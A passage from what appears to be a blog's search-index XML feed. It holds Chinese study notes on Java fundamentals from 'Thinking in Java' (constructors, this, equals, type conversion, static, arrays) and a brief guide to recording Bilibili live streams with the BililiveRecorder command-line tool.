默认构造器</h2><ul><li><strong>没有写构造器会自动创建无参构造器。</strong></li><li><strong>写了构造器，就不会自动创建构造器。</strong></li></ul><h2 id="5-4-this关键字"><a href="#5-4-this关键字" class="headerlink" title="5.4 this关键字"></a>5.4 this关键字</h2><ul><li><strong>在方法内部使用，表示调用该方法的那个对象的引用。</strong></li><li><strong>在方法中调用同一个类的另一个方法不需要用this，只有当需要明确指出对当前对象的引用时才用this。</strong><ul><li><strong>例如return this 或者作为参数传递给外部函数。</strong></li></ul></li><li><strong>在构造器中使用this调用另一个构造器。</strong></li></ul><h2 id="5-7-初始化顺序"><a href="#5-7-初始化顺序" class="headerlink" title="5.7 初始化顺序"></a>5.7 初始化顺序</h2><ul><li><strong>静态变量（只初始化一次）-》非静态变量-》构造器</strong></li></ul><h2 id="5-8-数组初始化"><a href="#5-8-数组初始化" class="headerlink" title="5.8 数组初始化"></a>5.8 数组初始化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数组初始化三种形式</span></span><br><span class="line"><span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span>[] array = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,&#125;;</span><br><span class="line"><span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br></pre></td></tr></table></figure><h3 id="5-8-1-可变参数列表"><a href="#5-8-1-可变参数列表" class="headerlink" title="5.8.1 可变参数列表"></a>5.8.1 可变参数列表</h3><ul><li><strong>用Object数组或Object… args作为参数即可。</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> java编程思想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第3章 操作符</title>
      <link href="/2021/06/06/%E7%AC%AC3%E7%AB%A0_%E6%93%8D%E4%BD%9C%E7%AC%A6/"/>
      <url>/2021/06/06/%E7%AC%AC3%E7%AB%A0_%E6%93%8D%E4%BD%9C%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<h2 id="3-2-和equals"><a href="#3-2-和equals" class="headerlink" title="3.2 ==和equals"></a>3.2 ==和equals</h2><ul><li><p><strong>==的含义：</strong></p><ul><li><strong>比较基本数据类型的值是否相同。</strong></li><li><strong>比较引用数据类型的地址是否相同。</strong></li></ul></li><li><p><strong>equals的含义：</strong></p><ul><li><strong>Object中的equals和==一样，都是比较对象的地址。</strong></li><li><strong>String在Object的基础上重写了equals，比较的是字符串的内容。</strong></li></ul></li><li><p><strong>String的equals源码</strong><br><img src="https://img10.360buyimg.com/ddimg/jfs/t1/182134/35/9178/113522/60c757a1Ed15aa1e2/f61d1016c4fe6fcb.jpg"> </p><h2 id="3-15-类型转换"><a href="#3-15-类型转换" class="headerlink" title="3.15 类型转换"></a>3.15 类型转换</h2></li><li><p><strong>编译器会在必要的时候自动将int转换到long。</strong></p></li><li><p><strong>小数据类型会自动转换为大数据类型。</strong></p><ul><li><strong>如：char、byte、short在运算时会自动转换为int。</strong></li></ul></li><li><p><strong>大数据类型到小数据类型需要强制转换。</strong></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> java编程思想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第1章 导论</title>
      <link href="/2021/06/05/%E7%AC%AC1%E7%AB%A0_%E5%AF%BC%E8%AE%BA/"/>
      <url>/2021/06/05/%E7%AC%AC1%E7%AB%A0_%E5%AF%BC%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="1-1"><a href="#1-1" class="headerlink" title="1.1"></a>1.1</h2><p><strong>每一个对象在内存中都有一个唯一的地址，new的对象在堆中。</strong></p><h2 id="1-3"><a href="#1-3" class="headerlink" title="1.3"></a>1.3</h2><p><strong>高内聚、低耦合：模块之间紧密联系，并且保持独立性。</strong></p><h2 id="1-4"><a href="#1-4" class="headerlink" title="1.4"></a>1.4</h2><ul><li><strong>public、private、protected</strong><ul><li><strong>private: 除类型创建者和类型的内部方法之外的任何人都不能访问。</strong></li><li><strong>protected：与 private作用相当，差别仅在于继承的类可以访问 protected成员，但是不能访问private成员。</strong></li></ul></li></ul><h2 id="1-5-组合"><a href="#1-5-组合" class="headerlink" title="1.5 组合"></a>1.5 组合</h2><ul><li><strong>组合：由类的对象组合成新类</strong>。<ul><li><strong>has-a（拥有）关系的时候用组合</strong> <strong>。</strong></li><li><strong>新类的成员对象通常都被声明为 private，使得可以在不干扰现有客户端代码的情况下，修改这些成员，也可以在运行时修改这些成员对象，以实现动态修改程序的行为。</strong></li><li><strong>通常用于在新类中使用现有类的功能而非接口的情况，即在新类中嵌入现有类的private对象</strong> <strong>。</strong></li></ul></li></ul><h2 id="1-6-继承"><a href="#1-6-继承" class="headerlink" title="1.6 继承"></a>1.6 继承</h2><p><strong>is-a（是一个）或者like-a（像是一个）的时候用继承</strong> <strong>。</strong><br><strong>有两种方法可以使基类与导出类产生差异：extends关键字、覆盖基类的方法。</strong><br><strong>判断用组合还是继承，先看看要不要向上转型</strong> 。</p><h2 id="1-8"><a href="#1-8" class="headerlink" title="1.8"></a>1.8</h2><p><strong>所有类继承于Object。</strong><br><strong>所有对象都在堆上创建（new）。</strong></p><h2 id="1-10-生命周期"><a href="#1-10-生命周期" class="headerlink" title="1.10 生命周期"></a>1.10 生命周期</h2><ul><li><strong>java完全采用动态内存分配方式。</strong><ul><li><strong>在堆栈上创建对象，编译器可以确定对象存活时间，自动销毁。但是在堆上创建对象，编译器对其生命周期一无所知</strong>。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> java编程思想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第2章 对象</title>
      <link href="/2021/06/05/%E7%AC%AC2%E7%AB%A0_%E5%AF%B9%E8%B1%A1/"/>
      <url>/2021/06/05/%E7%AC%AC2%E7%AB%A0_%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="2-2-基本数据类型"><a href="#2-2-基本数据类型" class="headerlink" title="2.2 基本数据类型"></a>2.2 基本数据类型</h2><p><strong>string不是基本数据类型。</strong><img src="https://img13.360buyimg.com/ddimg/jfs/t1/195661/8/8079/206780/60c755f6E54758dcd/ffdb69980ac7b6c1.jpg"></p><h3 id="2-2-2-高精度数字"><a href="#2-2-2-高精度数字" class="headerlink" title="2.2.2 高精度数字"></a>2.2.2 高精度数字</h3><ul><li><strong>高精度数字：BigInteger、BigDecimal</strong><ul><li><strong>BigInteger：支持任意精度的整数。</strong></li><li><strong>BigDecimal：支持任意精度的定点数。</strong></li></ul></li></ul><h3 id="2-2-3-创建数组对象就是创建一个引用数组。"><a href="#2-2-3-创建数组对象就是创建一个引用数组。" class="headerlink" title="2.2.3 创建数组对象就是创建一个引用数组。"></a>2.2.3 创建数组对象就是创建一个引用数组。</h3><h2 id="2-3-生命周期"><a href="#2-3-生命周期" class="headerlink" title="2.3 生命周期"></a>2.3 生命周期</h2><p><strong>java对象生命周期和基本类型不一样。用new创建的对象可以存活于作用域之外。</strong><br><strong>java垃圾回收器会监视new的对象，辨别不会再被引用的对象并释放内存空间。</strong></p><h2 id="2-4-初始值"><a href="#2-4-初始值" class="headerlink" title="2.4 初始值"></a>2.4 初始值</h2><p><strong>变量作为类的成员或全局变量会有初始默认值，局部变量没有初始值。</strong><br><strong><img src="https://img10.360buyimg.com/ddimg/jfs/t1/182601/20/9214/90450/60c756c2E31138148/e3d464be6e09303d.jpg"></strong></p><h2 id="2-5-java函数可以返回数组，c-c-不能"><a href="#2-5-java函数可以返回数组，c-c-不能" class="headerlink" title="2.5 java函数可以返回数组，c/c++不能"></a>2.5 java函数可以返回数组，c/c++不能</h2><h2 id="2-6-java库函数-java-util"><a href="#2-6-java库函数-java-util" class="headerlink" title="2.6 java库函数 java.util.*"></a>2.6 java库函数 <code>java.util.*</code></h2><h3 id="2-6-3-static-关键字"><a href="#2-6-3-static-关键字" class="headerlink" title="2.6.3 static 关键字"></a>2.6.3 static 关键字</h3><ul><li><strong>static适用于两种情况</strong><ul><li><strong>分配单一存储空间，不考虑创建多少对象或者不创建对象。</strong></li><li><strong>创建的方法不与包含它的类的对象关联起来</strong></li></ul></li><li><strong>创建static事物后，即使没有创建对象也可以调用static方法或static域。</strong></li></ul><p><strong><img src="https://img14.360buyimg.com/ddimg/jfs/t1/185967/29/9177/76016/60c756eeE4ec4eae5/e3b719fb7e5add2e.jpg"></strong></p><ul><li><strong>static变量或static方法可以通过类名直接引用，而且是首选方式</strong> <strong>。</strong></li><li><strong>static方法内部不能调用非static方法，非static方法可以调用static方法</strong> 。</li></ul>]]></content>
      
      
      <categories>
          
          <category> java编程思想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bilibili直播姬命令行版使用指南</title>
      <link href="/2020/06/13/Bilibili%E5%BD%95%E6%92%AD%E5%A7%AC%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%89%88%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97_/"/>
      <url>/2020/06/13/Bilibili%E5%BD%95%E6%92%AD%E5%A7%AC%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%89%88%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97_/</url>
      
        <content type="html"><![CDATA[<p><a name="R2n7M"></a></p><h1 id="下载与安装"><a href="#下载与安装" class="headerlink" title="下载与安装"></a>下载与安装</h1><p><a href="https://rec.danmuji.org/docs/cli/">https://rec.danmuji.org/docs/cli/</a><br />选择对应的版本后解压，打开终端，cd到解压后的文件夹<br><a name="wIaeO"></a></p><h1 id="录制"><a href="#录制" class="headerlink" title="录制"></a>录制</h1><p>直接输入./BililiveRecorder.Cli portable “存储视频的路径” 房间号<br />即可开始录制<br><a name="hHfLa"></a></p><h1 id="来，试试看！"><a href="#来，试试看！" class="headerlink" title="来，试试看！"></a>来，试试看！</h1>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
